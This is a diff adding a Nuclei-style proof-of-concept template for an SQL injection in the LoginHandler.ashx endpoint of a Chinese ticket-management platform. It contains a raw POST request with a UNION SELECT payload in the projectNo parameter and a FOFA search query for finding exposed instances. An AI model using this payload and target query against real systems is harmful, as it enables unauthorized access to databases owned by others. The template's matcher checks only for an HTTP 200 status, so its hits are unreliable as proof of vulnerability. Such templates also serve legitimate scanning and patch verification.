@@ -1,0 +1,28 @@
+id: poc-ouitu6yvp0fwhhxl
+info:
+  name: 中成科信票务管理平台LoginHandler存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ouitu6yvp0fwhhxl'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ouitu6yvp0fwhhxl
+    fofa: body="SystemManager/SoftwareLicense.htm"
+http:
+- raw:
+  - 'POST /LoginHandler.ashx HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+
+    Method=GetSeller&projectNo=1''union+select+1,sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''123''))--+'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
